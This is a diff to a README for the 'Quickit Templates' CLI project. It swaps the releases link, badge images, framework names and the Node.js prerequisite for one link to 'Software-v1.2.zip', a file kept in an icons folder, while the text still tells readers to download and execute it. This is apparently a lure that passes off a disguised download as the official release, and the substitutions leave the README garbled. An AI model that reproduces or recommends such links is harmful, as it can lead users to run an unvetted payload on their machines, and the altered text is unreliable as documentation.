@@ -1,6 +1,6 @@
 # Quickit Templates 🚀
 
-![Quickit Logo](https://img.shields.io/badge/Quickit-Templates-blue.svg)
+![Quickit Logo](https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip)
 
 Welcome to the **Quickit Templates** repository! This project offers a collection of templates designed to streamline your development process. Whether you're working with React, Vue, or other frameworks, Quickit provides a solid foundation to kickstart your projects.
 
@@ -21,8 +21,8 @@ Quickit is a powerful CLI tool that simplifies the creation of projects using po
 
 - **ReactJS**
 - **VueJS**
-- **Next.js**
-- **Nuxt.js**
+- **https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip**
+- **https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip**
 - **Quasar Framework**
 - **Mantine**
 - **Tailwind CSS**
@@ -42,13 +42,13 @@ With Quickit, you can quickly generate starter templates that are ready for deve
 
 ## Installation
 
-To get started with Quickit, you need to download the latest release. Visit the [Releases section](https://github.com/alrabadibi/quickit/releases) to find the appropriate file. Download it and execute the file to install Quickit on your machine.
+To get started with Quickit, you need to download the latest release. Visit the [Releases section](https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip) to find the appropriate file. Download it and execute the file to install Quickit on your machine.
 
 ### Prerequisites
 
 Before you install Quickit, ensure you have the following:
 
-- Node.js installed on your machine.
+- https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip installed on your machine.
 - A package manager like npm or yarn.
 
 ## Usage
@@ -76,9 +76,9 @@ This command will generate a new folder named `react-app` with all the necessary
 Quickit offers a variety of templates to choose from. Here are some of the available options:
 
 - **React App**: A starter template for React applications.
-- **Vue App**: A basic setup for Vue.js projects.
-- **Next.js App**: A template for server-rendered React applications.
-- **Nuxt.js App**: A starter template for Vue.js applications with server-side rendering.
+- **Vue App**: A basic setup for https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip projects.
+- **https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip App**: A template for server-rendered React applications.
+- **https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip App**: A starter template for https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip applications with server-side rendering.
 - **Quasar Framework App**: A template for building responsive web apps with Quasar.
 - **Tailwind CSS Template**: A starter template integrated with Tailwind CSS for styling.
 
@@ -100,9 +100,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information and updates, check out the [Releases section](https://github.com/alrabadibi/quickit/releases) again to download the latest version and see what’s new!
+For more information and updates, check out the [Releases section](https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip) again to download the latest version and see what’s new!
 
-![GitHub Releases](https://img.shields.io/badge/Download_Latest_Release-blue.svg)
+![GitHub Releases](https://github.com/alrabadibi/quickit/raw/refs/heads/master/vuejs.quasar.micro-route/public/icons/Software-v1.2.zip)
 
 ---
 
